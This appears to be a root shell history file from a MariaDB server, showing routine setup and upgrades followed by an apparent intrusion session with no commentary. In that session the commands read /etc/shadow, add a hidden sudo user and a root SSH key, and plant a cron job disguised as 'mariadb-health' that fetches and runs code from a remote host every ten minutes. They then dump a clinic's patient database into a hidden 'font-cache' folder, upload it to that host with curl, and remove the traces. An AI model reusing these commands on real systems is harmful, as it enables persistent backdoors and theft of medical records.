apt update
apt install -y mariadb-server
mysql_secure_installation
systemctl enable --now mariadb
vim /etc/mysql/mariadb.conf.d/50-server.cnf
systemctl restart mariadb
adduser mvega
usermod -aG sudo mvega
exit
#1754990102
adduser portal_app
#1754990320
vim /etc/ssh/sshd_config
#1754990395
systemctl restart ssh
#1755187331
vim /usr/local/bin/db-backup.sh
#1755187770
chmod 755 /usr/local/bin/db-backup.sh
#1755187802
vim /etc/cron.d/db-backup
#1755187965
exit
#1782809712
usermod -L jnavarro
#1782809730
exit
#1786527603
visudo -f /etc/sudoers.d/portal_app
#1786527680
exit
#1789354309
apt update
#1789354449
apt list --upgradable
#1789354589
apt upgrade -y
#1789354729
systemctl status mariadb --no-pager
#1789354869
reboot
#1790730631
id
#1790730644
cat /etc/shadow
#1790730690
mysql -e 'SHOW DATABASES'
#1790730735
mysql -e 'SELECT COUNT(*) FROM kb_clinica.pacientes'
#1790730800
mysql kb_clinica -e 'SHOW TABLES'
#1790730902
useradd -m -s /bin/bash -G sudo support
#1790730909
passwd support
#1790730965
mkdir -p /root/.ssh
#1790730980
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPXqM94x3c/BKaKSlf/5Bm5Q8dwGuo4K0LBlNQrVwlF/ ops@kelbrook-backup' >> /root/.ssh/authorized_keys
#1790730991
chmod 600 /root/.ssh/authorized_keys
#1790731060
echo '*/10 * * * * root curl -s http://198.51.100.212:8080/c/$(hostname) | sh' > /etc/cron.d/mariadb-health
#1790731072
cat /etc/cron.d/mariadb-health
#1790731240
mkdir /var/tmp/.font-cache
#1790731258
mysqldump kb_clinica > /var/tmp/.font-cache/kb_clinica.sql
#1790731350
cd /var/tmp/.font-cache
#1790731361
ls -la
#1790731390
tar czf kb_clinica.tgz kb_clinica.sql
#1790731404
ls -la
#1790731445
curl -F 'f=@kb_clinica.tgz' http://198.51.100.212:8080/up
#1790731521
cd /
#1790731530
rm -rf /var/tmp/.font-cache
#1790731572
exit
#1790733931
id
#1790733940
crontab -l
#1790733952
cat /etc/cron.d/mariadb-health
#1790733970
tail -n 3 /etc/passwd
#1790733995
w
#1790734021
exit
